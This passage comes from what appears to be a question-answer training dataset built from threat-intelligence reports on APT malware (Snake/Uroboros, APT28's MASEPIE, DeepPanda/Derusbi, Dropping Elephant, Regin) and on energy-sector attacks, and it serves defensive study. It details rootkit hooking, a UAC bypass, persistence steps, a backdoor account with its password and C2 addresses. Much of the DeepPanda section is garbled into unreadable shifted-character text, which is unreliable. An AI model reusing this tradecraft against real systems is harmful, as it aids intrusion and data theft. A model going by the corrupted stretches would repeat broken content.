d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/hook_helpers.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/libhook.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/idthook.c\n\u2022 .\\rk_ntsystem.c\n\u2022 ..\\common\\helpers\\interface_s.c\n\u2022 ..\\k2\\fa_registry.c\n\u2022 ..\\k2\\syshook.c\nThe source control check-in log examples, showing the names of the developers to be 'vlad' and 'gilg':\n\u2022 $Id: snake_config.c 5204 2007-01-04 10:28:19Z vlad $\n\u2022 $Id: mime64.c 12892 2010-06-24 14:31:59Z vlad $\n\u2022 $Id: event.c 14097 2010-11-01 14:46:27Z gilg $\n\u2022 $Id: named_mutex.c 15594 2011-03-18 08:04:09Z gilg $\n\u2022 $Id: nt.c 20719 2012-12-05 12:31:20Z gilg $\n\u2022 $Id: ntsystem.c 19662 2012-07-09 13:17:17Z gilg $\n\u2022 $Id: rw_lock.c 14516 2010-11-29 12:27:33Z gilg $\n\u2022 $Id: rk_bpf.c 14518 2010-11-29 12:28:30Z gilg $\n\u2022 $Id: t_status.c 14478 2010-11-27 12:41:22Z gilg $\nIt also exposed the project name of this particular variant as 'sengoku':\nd:\\proj\\cn\\fa64\\sengoku\\_bin\\sengoku\\win32_debug\\sengoku_Win32.pdb\nNow it's time to execute the driver and see what it does.\nBig Headline: ROOTKIT EXECUTION\nWhen first executed, the driver creates device named \\Device\\vstor32 with a symbolic link \\DosDevices\\vstor32.  This device is used for userland/kernel communications.\nNext, it drops a DLL into the %windows% directory - the DLL is carried in the body of the driver as a binary chunk with  XOR 0xAA applied on top of it, so the driver decrypts it first.\nDepending on the variant, the DLL is dropped either under a random name or a hard-coded name, such as mscpx32n.dll.\nThe purpose of this DLL is to be injected into the user-mode processes. Some variants of Snake carry the DLL modules that can be installed as a service, to be run within taskhost.exe or services.exe processes.\nNext, the driver sets up the hooks for the following kernel-mode APIs:\n\u2022 ZwCreateThread\n\u2022 ZwCreateUserProcess\n\u2022 ZwShutdownSystem\nAfter that, it calls PsSetCreateProcessNotifyRoutine() in order to be notified whenever a new process is started.\nThe handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system, being able to infect any newly created processes, and restore its driver file in case it gets deleted.\nAnother set of hooks it sets is designed to hide the presence of the Snake components on the system:\n\u2022 ZwQuerySystemInformation\n\u2022 ZwQueryInformationProcess\n\u2022 ZwClose\n\u2022 ZwTerminateProcess\nThe driver then watches for all userland processes to see if they load any web pages.\nAs long as the user is not using the Internet, Snake stays dormant too, as there is no process that communicates with the web servers.\nHowever, as soon as the user goes online, the driver intercepts that event and then immediately injects the malicious DLL module into the process that initiated connection (the browser).\nOnce injected, the module initiates polling from one of the hard-coded C&C servers.\nThe purpose of this behaviour is to blend Snake's traffic with the browser traffic, bypassing the firewalls, and keeping a low profile at the same time. By communicating from within a process that also communicates, even a technically savvy user will find it challenging to detect Snake traffic among legitimate traffic.\nThe reason behind such difficulty is because modern web pages often fetch pages from the different web servers, including such data as additional scripts, CSS templates, advertising contents, analytics data, blogs, social networking data, etc. When intercepted with the purpose of analysis, such traffic may literally represent itself hundreds of DNS and HTTP requests made when a popular website, such as a news website is open.\nHiding a few DNS/HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed.\nIn order to test Snake's communications with the C&C servers, and still being able to clearly distinguish its traffic, a small tool was built to generate GET request to a web server running on the analysed system.\nThe tool was named as chrome.exe in order to trigger the malware communications.\n\nBased on the above text, answer a question. What insights can be gained from the compile timestamps and patterns of the Snake malware samples, and how do these patterns reflect the behavior of the malware operators?",
    "output": "The compile timestamps of the Snake malware samples reveal that the malware activity is ongoing, with samples compiled as recently as January 2014. Plotting the day of the week and hour of the day in which the samples were compiled shows a familiar pattern for modern cyber-attacks: the creators of the malware operate during a standard working week and working day. This suggests that the operators follow a professional schedule, similar to legitimate software development teams. Adjusting the timestamps to UTC+4 indicates a possible fit to the operators' local time zone, providing clues about their geographical location and working habits.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: OVERVIEW\nThe energy sector has become a major focus for targeted attacks and is now among the top five most targeted sectors worldwide. Companies in the sector are facing a growing risk of having their services interrupted or losing data. The threat to energy firms is only likely to increase in the coming years as new developments, such as further extensions of smart grids and smart metering expose more infrastructure to the Internet. Equipment that is not connected to the Internet and other networks is not immune to threats and there has already been a number of successful attacks against isolated systems. Operators of critical infrastructure, as well as energy utility companies, need to be aware of these threats and prepare accordingly.\nThe threat to energy firms comes from several different sources. In some cases, espionage from competitors is the primary motive, with data on new projects, exploration and finances being targeted. Disruption and destruction are the goals of other attacks. Some instances appear to be state sponsored, such as the disruption of the Iranian nuclear program by the Stuxnet worm in 2010, one of the attacks that began this trend. Others appear to be the work of hacktivists with political or environmental agendas. Internal attackers, like disgruntled employees, are also a major source of attacks that often lead to service disruption. The majority of the actors behind these attacks have grown more sophisticated in the way they attack.\nDuring the monitoring period from July 2012 to June 2013, we observed an average of 74 targeted attacks per day globally. Of these, nine attacks per day targeted the energy sector. Accounting for 16.3 percent of all attacks, the energy sector was the second most targeted vertical in the last six months of 2012, with only the government/public sector exceeding it with 25.4 percent of all attacks. The high ranking was mainly due to a major attack against a global oil company, which we observed in September 2012. However, in the first half of 2013 the energy sector continued to attract a high proportion of attacks, ranking in fifth place with 7.6 percent of targeted attacks.\nNot all of the attacks analyzed used highly sophisticated tools. Most of them could have been prevented by following best practice guidelines for protecting the IT infrastructure and the industrial components, indicating that despite high revenues and strategic importance, many energy sector companies are not prioritizing cybersecurity.\nMedium Headline: Exposed systems: Online and offline\nHistorically most industrial control systems (ICS) and supervisory control and data acquisition (SCADA) systems were in separated networks not connected to the Internet or any other network. Unfortunately this security through segregation approach does not fully protect against cyberattacks. In reality, networks are rarely completely isolated. Often some configuration updates are periodically installed or log files are transferred. If systems are not directly connected, the method of choice for these types of interactions is usually through a USB stick or a non-permanent modem connection, which provides a way into the restricted networks. This allows malware to spread into such isolated networks as demonstrated many times by threats such as Stuxnet.\nIf networks are truly segregated, this would mean that there would be no software updates installed, leaving old vulnerabilities open. There are also issues around processes. For example, the revocation lists for digital certificates are seldom updated and therefore certificates which are no longer valid cannot be checked properly and would still be accepted.\nWith the increasing desire for connectivity now reaching industrial plants, many operators have started to connect their ICS to the Internet. New adapters can bridge to older technology which was never intended to be controlled over the Internet, allowing it to be connected easily. This allows for efficient centralized monitoring and, to some extent, remote control of equipment.\nDepending on the type of machinery controlled through the human-machine interface (HMI) of the ICS, not all modifications are possible. Some systems are physically connected in a pure read-only mode for monitoring. And even if they are fully connected, some turbines have physical limitations or emergency systems based on physical effects that cannot be overridden by the digital controller. Thus, not all Hollywood scenarios of open flood gates or turbines that fly through the air are possible. However, sabotage attacks that damage equipment are definitely possible, as has already been demonstrated. In the future, more systems are going to implement the failsafe switches in software, opening up the vector for malware attacks.\nAn additional source of concern is that some countries have started to open the energy market for smaller private contributors. This means that almost anyone can use mini power plants like water, wind or photovoltaic sites to feed energy back into the power grid. Often these operators do not have a full IT staff supporting the facilities at hand, which might lead to more vulnerable installations. Furthermore they may deploy new technology which might be untested and contain some unknown vulnerabilities. While these smaller sites make up only a small portion of the grid, new decentralized power input feeds are a challenge for the balance of the power grid as well and need to be carefully monitored. Small outages or changes can have a domino effect for the whole power grid.\nTo increase the exposure of energy firms even further, sites like , which is essentially a search engine for devices, enable anyone to easily find exposed controllers on the Internet. Of course not all of the industrial control systems connected to the Internet are critical systems or even real ones. Some researchers have started to create honey pot systems in order to study the attackers, which have apparently already attracted attackers like the Comment Crew/APT1 group, who have broken into these decoy systems.\nMedium Headline: Smart grid: A new potential avenue of attack\nIn addition to the issue of securing these devices, smart grids will produce a huge amount of data which, depending on regulations, will need to be kept for audits. Some of this data may be sensitive and could raise privacy concerns if not properly protected. This could easily grow to petabytes of data that needs to be safely stored and managed.\nIt is beyond the scope of this paper to address all the challenges associated with smart grids and smart meters. Symantec has created a dedicated whitepaper for this topic: . As a member of the CRISALIS project, Symantec is following these developments closely and is helping to secure critical infrastructure together with partners from academia and different industry sectors.\nSmall Headline: 2013\nIn 2013 part of the Austrian and German power grid nearly broke down after a control command was accidentally misdirected. It is believed that a status request command packet, which was broadcast from a German gas company as a test for their newly installed network branch, found its way into the systems of the Austrian energy power control and monitoring network. Once there, the message generated thousands of reply messages, which generated even more data packages, which in turn flooded the control network. To stop this self-inflicted DDoS attack, part of the monitoring and control network had to be isolated and disconnected. Fortunately the situation was resolved without any power outages.\nSmall Headline: 2003\nIn 2003 the safety monitoring system of the Ohio nuclear power plant apparently went offline for several hours due to a Slammer worm infection. Fortunately the power plant was already offline due to maintenance and the installed secondary backup monitoring system was unaffected by the worm. Nevertheless the incident raised safety concerns.\nAt the beginning of 2003 a marine terminal in Venezuela was targeted by a sabotage attack. Details of this attack are scarce and vague, but it seems that during a strike an attacking group managed to get access to the SCADA network of the oil tanker loading machinery and overwrote programmable logic controllers (PLCs) with an empty program module. This halted machinery, preventing oil tankers from loading for eight hour till the unaffected backup code was reinstalled on the PLCs. The attack was not too sophisticated as it was easily spotted. A small modification of the PLC code instead would probably have gone unnoticed for a long time.\nSmall Headline: 2001\nIn 2001 an attack took place against California's power distribution center, which controls the flow of electricity across California. Due to apparently poor security configuration, the attacker was able to compromise two Web servers that were part of a developer network and penetrate further from there. Fortunately the attackers were stopped before they managed to attack any systems which were tied into the transmission grid for the Western United States.\nSmall Headline: 2000\nAccording to Russian officials, the largest natural gas extraction company in the country was successfully attacked in 2000. The attackers used a Trojan to gain access to the control for the gas pipelines. Through this switchboard, the flow for individual gas pipelines could have been modified, which would easily have caused widespread disruption.\nAside from these incidents, there have also been a number of more serious and well-documented targeted attacks against the energy sector:\n\nAnswer this question based on the above context: What are the implications of smart grids on data management and privacy within the energy sector?",
    "output": "Smart grids generate a vast amount of data, which must be securely stored and managed. Depending on regulations, this data may need to be kept for audits and can include sensitive information that raises privacy concerns if not properly protected. Managing this data effectively requires robust security measures to prevent unauthorized access and ensure compliance with privacy regulations. The volume of data can grow to petabytes, necessitating advanced storage and management solutions to maintain security and privacy.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: general information\nDuring December 15-25, 2023, several cases of distribution of e-mails with links to \"documents\" were discovered among state organizations, visiting which led to damage of computers with malicious programs.\nIn the process of investigating the incidents, it was found that the mentioned links redirect the victim to a web resource where, with the help of JavaScript and features of the application protocol \"search\" (\"ms-search\") (<https://www.trellix.com/about/newsroom/stories/research/beyond-file-search-a-novel-method/>)[1], a shortcut file is downloaded, the opening of which leads to the launch A PowerShell command designed to download from a remote (SMB) resource and run (open) a decoy document, as well as the Python programming language interpreter and the Client.py file classified as MASEPIE.\nUsing MASEPIE, OPENSSH (for building a tunnel), STEELHOOK PowerShell scripts (stealing data from Chrome/Edge Internet browsers), and the OCEANMAP backdoor are loaded and launched on the computer. In addition, IMPACKET, SMBEXEC, etc. are created on the computer within an hour from the moment of the initial compromise, with the help of which network reconnaissance and attempts at further horizontal movement are carried out.\nAccording to the combination of tactics, techniques, procedures and tools, the activity is associated with the activities of the APT28 group. At the same time, it is obvious that the malicious plan also involves taking measures to develop a cyber attack on the entire information and communication system of the organization. Thus, the compromise of any computer can pose a threat to the entire network.\nIt should be noted that cases of similar attacks have also been recorded in relation to Polish organizations.\nAnswer this question: How does the APT28 group leverage the 'ms-search' protocol and JavaScript in their recent attacks against state organizations? What specific tools and techniques are employed post-compromise to facilitate lateral movement and data exfiltration?",
    "output": "The APT28 group utilizes the 'ms-search' protocol and JavaScript to redirect victims to a web resource where a shortcut file is downloaded. This shortcut file triggers a PowerShell command that downloads and executes a decoy document, a Python interpreter, and the Client.py file, which is classified as MASEPIE. Post-compromise, the group employs various tools and techniques to facilitate lateral movement and data exfiltration. These include OPENSSH for building tunnels, STEELHOOK PowerShell scripts for stealing data from Chrome/Edge browsers, and the OCEANMAP backdoor. Additionally, tools like IMPACKET and SMBEXEC are used for network reconnaissance and further horizontal movement within the compromised network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Initial C2 Phone Home Beacon\n7KH\ue003&\ue015\ue003ORFDWLRQ\ue003LQ\ue003WKLV\ue003VDPSOH\ue003LV\ue003VWDWLFDOO\\\ue003GH\u00bfQHG\ue003DV\ue003\ue014\ue011\ue01c\ue011\ue018\ue011\ue016\ue01b\ue01d\ue017\ue017\ue016\ue003\ue00b0DOD\\VLD\ue01d\ue0037PQHW\ue00f\ue0037HOHNRP\ue0030DOD\\VLD\ue003 %KG\ue00c\ue011\ue003:KLOH\ue003WKHUH\ue003LV\ue003\u00b5GHDG\ue003FRGH\u00b6\ue003WKDW\ue003ZLOO\ue003GRZQORDG\ue003WKH\ue003&\ue015\ue003ORFDWLRQ\ue003IURP\ue003DQ\ue003+773\ue00385/\ue003WKDW\ue003FRXOG\ue003EH\ue003GH\u00bfQHG\ue003 in the binary, using the User-Agent string \"Google\", this code is not activated due to the format of the statLFDOO\\\ue003GH\u00bfQHG\ue003&\ue015\ue003ORFDWLRQ\ue003XVLQJ\ue003DQ\ue003,3\ue003DGGUHVV\ue011\ue0037KXV\ue003WKH\ue003VDPSOH\ue003ZLOO\ue003RQO\\\ue003DWWHPSW\ue003WR\ue003FRQQHFW\ue003GLUHFWO\\\ue003XVLQJ\ue003 a raw socket to the C2 located at 1.9.5.38:443. This indicates the use of a 'boiler plate code' or a builder software package that automates the creation of the malicious sample.\nThe malicious sample sends an initial beacon to the C2 that includes the following information:\n\"\ue003\ue0037KH\ue003FRPSXWHU\ue003QDPH\ue003DV\ue003REWDLQHG\ue003ZLWK\ue003WKH\ue003*HW&RPSXWHU1DPH\ue00b\ue00c\ue003$3,\n\"\ue003\ue0037KH\ue003XVHUQDPH\ue003RI\ue003WKH\ue003FXUUHQW\ue0035HPRWH\ue003'HVNWRS\ue003VHVVLRQ\ue003LI\ue003FXUUHQWO\\\ue003EHLQJ\ue003H[HFXWHG\ue003LQ\ue003D\ue0035HPRWH\ue003    Desktop session or \"none\" otherwise.\n\"\ue003\ue0037KH\ue003FXUUHQWO\\\ue003ORJJHG\ue003LQ\ue003XVHUQDPH\ue003LQ\ue003WKH\ue003V\\VWHP\ue003DV\ue003REWDLQHG\ue003ZLWK\ue003WKH\ue003*HW8VHU1DPH\ue00b\ue00c\ue003$3,\n\"\ue003\ue0037KH\ue003PDFKLQH\u00b6V\ue003XSWLPH\n\"\ue003\ue0037KH\ue003:LQGRZV\ue003YHUVLRQ\ue003DQG\ue0036HUYLFH\ue0033DFN\ue003OHYHO\n\"\ue003\ue0037KH\ue003DPRXQW\ue003RI\ue003DYDLODEOH\ue0033K\\VLFDO\ue0030HPRU\\\ue003LQ\ue0030%\n\"\ue003\ue003&XUUHQW\ue0035HPRWH\ue003'HVNWRS\ue003VHVVLRQV\ue003DV\ue003HQXPHUDWHG\ue003ZLWK\ue003:76(QXPHUDWH6HVVLRQV\n\"\ue003\ue003$\ue003VWULQJ\ue003LGHQWL\u00bfHU\ue003VWDWLFDOO\\\ue003VHW\ue003WR\ue003\u00b3)%,\ue015\ue013\ue014\ue014\ue014\ue013\ue015\ue017\u00b4\n7KH\ue003EHDFRQ\ue003LV\ue003HQFU\\SWHG\ue003XVLQJ\ue003DQ\ue003;25\ue012$''\ue003ORRS\ue003XVLQJ\ue003WKH\ue003VWDWLFDOO\\\ue003GH\u00bfQHG\ue003NH\\\ue003\ue013[\ue014&\ue003DQG\ue003VHQW\ue003WR\ue003WKH\ue003&\ue015\ue011\ue003\ue003\nThe following python function can be used to decode the beacon stings:\ndef decode(crypted): decoded=\"\"\nfor x in crypted:    decoded+=chr(((ord(x)^(0x1C +1)) + (0x1C +1)) & 0xFF)  return decoded\nWhen command 0x23000004 is received, a temporary new user \"_DomainUser_\" with password \"Dom4!nUserP4ss\" is created and added to the local Administrators group. The backdoor is then started under that account and the user is deleted. It would appear this technique is meant to obfuscate the activities of the malicious sample by masking the process creator's user name to appear to be a generic domain user. Note that such an account does not normally exist in an Active Directory environment.\nAdditionally, the primary C2 connection allows for requests to start additional connections to the C2 implementing the following functionality:\n\"\ue003\ue003$\ue003SURFHVV\ue003FRQWURO\ue003FRQQHFWLRQ\ue003LQLWLDWHG\ue003E\\\ue003FRPPDQG\ue003\ue013[\ue015\ue018\ue013\ue013\ue013\ue013\ue013\ue013\ue003WKDW\ue003DOORZV\ue003IRU\ue003HQXPHUDWLRQ\ue003DQG\ue003\ue003    killing of running processes\n\"\ue003\ue003$\ue003SLSHG\ue003FRPPDQG\ue003OLQH\ue003SURFHVV\ue003FRQQHFWLRQ\ue003WKDW\ue003DOORZV\ue003FRPPXQLFDWLRQ\ue003ZLWK\ue003VWDQGDUG\ue003LQSXW\ue003DQG    output of arbitrary executables; initiated by command 0x23000000\n\"\ue003\ue003$\ue003\u00bfOH\ue003EURZVHU\ue003FRQQHFWLRQ\ue003LQLWLDWHG\ue003E\\\ue003FRPPDQG\ue003\ue013[\ue015\ue014\ue013\ue013\ue013\ue013\ue013\ue013\ue003WKDW\ue003DOORZV\ue003IRU\n|\ue003 /LVWLQJ\ue003GLUHFWRU\\\ue003FRQWHQWV\n|\ue003 &RS\\LQJ\ue00f\ue003GHOHWLQJ\ue003DQG\ue003PRYLQJ\ue003\u00bfOHV\n|\ue003 2SHQLQJ\ue003\u00bfOHV\ue003XVLQJ\ue003WKH\ue0036KHOO([HFXWH\ue00b\ue00c\ue003$3,\n|\ue003 'RZQORDGLQJ\ue003DQG\ue003XSORDGLQJ\ue003\u00bfOHV\ue003IURP\ue003\ue012\ue003WR\ue003WKH\ue003&\ue015\n\"\ue003\ue003$\ue0035HPRWH\ue003'HVNWRS\ue003VHVVLRQ\ue003HQXPHUDWRU\ue003LQLWLDWHG\ue003E\\\ue003FRPPDQG\ue003\ue013[\ue015\ue014\ue013\ue014\ue013\ue013\ue013\ue013\nMedium Headline: Post Exploitation Tool Sample (MD5:  2dce7fc3f52a692d8a84a0c182519133)\nThis sample is typical of a post exploitation tool; it is written in .NET 2.0. This code appears to have been compiled on Thursday May 26th, 2011 at 10:21:44 A.M. UTC (early evening time in China). The backdoor functionality can be instantiated either directly from the command line or through commands issued over a network based protocol via the C2. If no arguments are given, a connection to the C2 is initiated to the statiFDOO\\\ue003GH\u00bfQHG\ue003,3\ue003DGGUHVV\ue011\ue003\ue0037KH\ue003FRPPDQG\ue003OLQH\ue003RSWLRQV\ue003VXSSRUW\ue003SRVW\ue003H[SORLWDWLRQ\ue003FDSDELOLWLHV\ue003VXFK\ue003DV\ue003FKDQJLQJ\ue003 \u00bfOH\ue003WLPHVWDPSV\ue00f\ue003IRUHQVLF\ue003PLWLJDWLRQ\ue00f\ue003SULYLOHJH\ue003HVFDODWLRQ\ue00f\ue003ODXQFKLQJ\ue003WKH\ue003H[HFXWDEOH\ue00f\ue003DQG\ue003VSHFLI\\LQJ\ue003D\ue003VSHFL\u00bfF\ue003 C2.\n2QH\ue003LQWHUHVWLQJ\ue003FRPPDQG\ue003OLQH\ue003RSWLRQ\ue003DOORZV\ue003WKH\ue003EDFNGRRU\ue003WR\ue003\u00bfOWHU\ue003WKH\ue003FRQWHQWV\ue003RI\ue003VSHFL\u00bfHG\ue003\u00bfOHV\ue003WR\ue003UHPRYH\ue003 FRQWHQW\ue003XVLQJ\ue003D\ue003UHJXODU\ue003H[SUHVVLRQ\ue003\ue00bUHJH[\ue00c\ue011\ue003\ue0037KLV\ue003FRPPDQG\ue003WKHQ\ue003PRGL\u00bfHV\ue003WKH\ue003FUHDWLRQ\ue00f\ue003PRGL\u00bfFDWLRQ\ue00f\ue003DQG\ue003ODVW\ue003 DFFHVV\ue003WLPHVWDPSV\ue003RI\ue003WKH\ue003PRGL\u00bfHG\ue003\u00bfOH\ue003WR\ue003FRQFHDO\ue003WKH\ue003FRQWHQW\ue003PRGL\u00bfFDWLRQV\ue011\ue003\ue003$\ue003GHWDLOHG\ue003OLVWLQJ\ue003RI\ue003FRPPDQG\ue003 line arguments can be viewed in Appendix A.  This activity is generally associated with log cleaning to com-plicate a forensic investigation.\nThe sample contains an embedded IP address for C2 that is stored in an encrypted format as a string resource:\nW\ue003 \ue003\u00b3\ue014\ue017P-T<K-.FK-X7PR6=N-.D\ue017\ue015&\ue01a\ue01b\ue01b\ue018\ue01c\ue01c\ue01a%\ue018\ue015\ue016)\ue019\ue016\ue018\ue019\ue019)\ue017\ue013\ue01a)\ue016\ue01b\ue016\ue017%&&\ue018\ue017$$$\ue016\ue015\ue018\ue015\ue017\u00b4\nVariants of this Trojan are sometimes detected under the name 'Derusbi' by Microsoft, Trend, Sophos and Symantec AV engines.\nThis sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide an interactive command line shell to the C2.  It also is able to bypass User Account Control (UAC) to install itself by using the 'sysprep.exe' Microsoft Windows executable provided by the targeted system. The steps it takes to install itself onto a system are as follows:\n1. Copies itself to to %WINDIR%\\system32\\Msres<3 random characters>.ttf\n\ue015\ue011\ue003\ue003$IWHU\ue003LW\ue003FRSLHV\ue003LWVHOI\ue00f\ue003LW\ue003ZLOO\ue003PRGLI\\\ue003WKH\ue003FUHDWLRQ\ue003WLPH\ue00f\ue003ODVW\ue003DFFHVV\ue003WLPH\ue003DQG\ue003ODVW\ue003PRGL\u00bfFDWLRQ\ue003WLPH\ue003WR     the current system time when the copy was made but with the year changed to 2005.\n\ue016\ue011\ue003\ue003$GGV\ue003LWVHOI\ue003DV\ue003D\ue003VHUYLFH\ue003QDPH\ue003IURP\ue003WKH\ue003EDFNGRRU\u00b6V\ue003FRQ\u00bfJXUDWLRQ\ue003XQGHU\ue003+.(<B/2&$/B     MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\<service>\" This defaults to \"wuauserv\", \ue003\ue003\ue003\ue003\ue003WKH\ue003OHJLWLPDWH\ue003:LQGRZV\ue0038SGDWH\ue003VHUYLFH\ue00f\ue003LQ\ue003WKH\ue003JLYHQ\ue003ELQDU\\\u00b6V\ue003GHIDXOW\ue003FRQ\u00bfJXUDWLRQ\ue011\n4.\nAdds itself to list of services started by 'netsvc' using the service name 'helpsvc'.\n5.\nIf McAfee AV is installed, creates a copy of regsvr32.exe named Update.exe and then schedules     the copy to be deleted on reboot using the well documented MoveFileExA API.\n6. It then calls either the original or copy of regsvr32.exe with the parameters /s /u and the path to     the copy of itself it made in Step 1. The /u parameter means \"uninstall\", which calls      DllUnregisterServer, this is an unsophisticated method of DLL entry point obfuscation.\n7. DllUnregisterServer installs the driver and initiates the backdoor component.\n7KH\ue003VDPSOH\ue003LV\ue003FDSDEOH\ue003RI\ue003\u00b5GURSSLQJ\u00b6\ue003DQ\ue003HPEHGGHG\ue012HQFU\\SWHG\ue003NHUQHO\ue003GULYHU\ue011\ue003\ue003,I\ue003WKH\ue003SURFHVV\ue003\u00b3=KX'RQJ)DQJ<X\ue011 exe\" is running (AntiVirus360 program from the Chinese 'Quihoo 360 Technology Co., LTD' 360 ), or the username of the DLL's host process context is not 'SYSTEM', the driver is not written to disk.  Barring the two aforementioned conditions, the sample decrypts the kernel driver to:\n\"%sysdir%\\Drivers\\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys\"\n)ROORZLQJ\ue003WKH\ue003GHFU\\SWLRQ\ue003DQG\ue003ZULWLQJ\ue003RI\ue003WKH\ue003GULYHU\ue003WR\ue003GLVN\ue00f\ue003LW\ue003LV\ue003ORDGHG\ue003XVLQJ\ue003WKH\ue003=Z/RDG'ULYHU\ue00b\ue00c\ue003$3,\ue011\ue0037KH\ue003GULY-HU\ue003LV\ue003HQFU\\SWHG\ue003ZLWK\ue003D\ue003VLPSOH\ue003IRXU\ue003E\\WH\ue003;25\ue003NH\\\ue003YDOXH\ue003RI\ue003\ue013[\ue015(\ue01b\ue01b\ue018')\ue016\ue01e\ue003DIWHU\ue003GHFU\\SWLRQ\ue003WKH\ue003\u00bfOH\ue003KDV\ue003WKH\ue0030'\ue018\ue003 hash of dae6b9b3b8e39b08b10a51a6457444d8.\n7KH\ue003PDOZDUH\ue003FRQWDLQV\ue003D\ue003G\\QDPLF\ue003FRQ\u00bfJXUDWLRQ\ue003VWRUHG\ue003LQ\ue003WKH\ue0035HJLVWU\\\ue003XQGHU\n\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Rpc\\Security\"\nDQG\ue003ORDGV\ue003D\ue003GHIDXOW\ue003FRQ\u00bfJXUDWLRQ\ue003HPEHGGHG\ue003LQWR\ue003WKH\ue003ELQDU\\\ue003LI\ue003VXFK\ue003D\ue003FRQ\u00bfJXUDWLRQ\ue003LV\ue003QRW\ue003IRXQG\ue011\ue0037KH\ue003ZD\\\ue003 WKLV\ue003GHIDXOW\ue003FRQ\u00bfJXUDWLRQ\ue003LV\ue003ORDGHG\ue003DQG\ue003SDUVHG\ue003LQGLFDWHV\ue003WKDW\ue003WKLV\ue003PDOZDUH\ue003KDV\ue003EHHQ\ue003EXLOW\ue003ZLWK\ue003D\ue003\u00b5EXLOGHU\u00b6\ue003WKDW\ue003 WDNHV\ue003D\ue003WHPSODWH\ue003VDPSOH\ue003DQG\ue003OHWV\ue003DQ\ue003XQVRSKLVWLFDWHG\ue003XVHU\ue003VSHFLI\\\ue003D\ue003FRQ\u00bfJXUDWLRQ\ue003ZLWKRXW\ue003UHFRPSLOLQJ\ue003DQ\\\ue003 code.\n,I\ue003WKH\ue003FXUUHQW\ue003VHUYLFH\ue003QDPH\ue003PDWFKHV\ue003D\ue003VHW\ue003RI\ue003SUH\ue010GH\u00bfQHG\ue003VHUYLFH\ue003QDPHV\ue003WKDW\ue003OHJLWLPDWHO\\\ue003H[LVW\ue003LQ\ue003:LQGRZV\ue00f\ue003 the backdoor then loads the original service's DLL into the address space with LoadLibrary and invokes the ServiceMain export. This effectively hijacks the original service's entry while retaining its functionality.\nWhile there is code in the binary that allows downloading a list of C2 servers from an HTTP URL, the default FRQ\u00bfJXUDWLRQ\ue003SUHVHQW\ue003VSHFL\u00bfHV\ue003\ue015\ue013\ue015\ue011\ue01b\ue019\ue011\ue014\ue01c\ue013\ue011\ue016\ue01d\ue01b\ue013\ue003DV\ue003D\ue003&\ue015\ue003WR\ue003XVH\ue00f\ue003WKLV\ue003LV\ue003WKH\ue003VDPH\ue003+RQJ\ue003.RQJ\ue003&\ue015\ue003VHUYHU\ue003DV\ue003 the one used by the post exploitation .NET tool.\n\nBased on the above text, answer a question. Describe the installation process of the DeepPanda malware's DLL component, including how it bypasses User Account Control (UAC) and installs itself as a service.",
    "output": "The DeepPanda malware's DLL component is installed through a series of steps. First, it copies itself to %WINDIR%\\\\system32\\\\Msres<3 random characters>.ttf and modifies the file's timestamp to appear as if it was created in 2005. It then registers itself as a service, typically using the name 'wuauserv', and adds itself to the list of services started by 'netsvc' using the service name 'helpsvc'. If McAfee AV is installed, it creates a copy of regsvr32.exe named Update.exe and schedules it for deletion on reboot. The malware then calls regsvr32.exe with specific parameters to unregister the DLL, which is an unsophisticated method of DLL entry point obfuscation. Finally, the DllUnregisterServer function installs the driver and initiates the backdoor component. The driver is decrypted and written to '%sysdir%\\\\Drivers\\\\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys' unless certain conditions are met, such as the presence of specific antivirus software or if the DLL's host process context is not 'SYSTEM'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Dropping Elephant APT group use social engineering to execute its primary infection vectors, and what specific vulnerabilities do they exploit?",
    "output": "The Dropping Elephant APT group employs two main infection vectors, both heavily reliant on social engineering themes related to foreign relations with China. The first vector involves spear-phishing targets with a document containing remote content. Once opened, a 'ping' request alerts the attackers, who then send another email with an MS Word or PowerPoint document. These documents exploit specific vulnerabilities: CVE-2012-0158 for Word and CVE-2014-6352 for PowerPoint. The second vector uses watering hole attacks, where a fake news website prompts users to download a PowerPoint document to read the full article, which also contains malicious content.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Regin/ Prax/ WarriorPride\nThe Regin malware campaign targeted international organizations from 2008 to 2011 and from 2013-2014. The malware may have remained undiscovered for at least five years prior to 2008. The complexity of the toolkit suggests the investment of significant resources over several years. In support of this assumption, Symantec notes that Regin appears to be designed for espionage campaigns that last several years.\nThe malware is allegedly the product of a collaboration between the United States NSA and the British GCHQ. This allegation derives from a document leaked to Der Spiegel and the Intercept by Edward Snowden. The malware primarily targeted systems belonging to private individuals, small businesses, and telecommunications companies in Russia, Saudi Arabia, Mexico, Ireland, and to a lesser extent, India, Afghanistan, Iran, Belgium, Austria, and Pakistan.\nSymantec notes that the framework has been used for mass surveillance against \"government organizations, infrastructure operators, businesses, researchers, and private individuals. \" Nearly half of the attacks targeted private individuals. The quarter of the infections against telecommunication infrastructure was likely an attempt to gain access to the calls routed through the networks. Regin does not have a clear infection vector; though, Symantec suspects that some infections are the result of watering-hole attacks and zero-day exploits.\nRegin consists of a trojan and a backdoor that are widely customizable to fit the target. The platform excels at remaining undetected and obfuscating its indicators of compromise. Regin is a modular platform, reminiscent of Flame, Duqu, and Stuxnet. The Regin backdoor is a five stage modular component and each stage after the first is hidden and encrypted. After each successful installation of a stage, the next stage is decrypted and installed. Each piece provides as little information as possible about the total component. If any stage fails then the installation terminates. The flexibility of the Regin platform means that the actor can customize the payload to the target. Consequently, Regin has dozens of discovered payloads and likely has many more that remain known only to the actor. In general, the platform features several remote access trojans (RATs), and tools to capture screenshots, log keystrokes, monitor network traffic, steal credentials, recover deleted files, and hijack the point and click functions of the mouse. According to Symantec, advanced payloads also 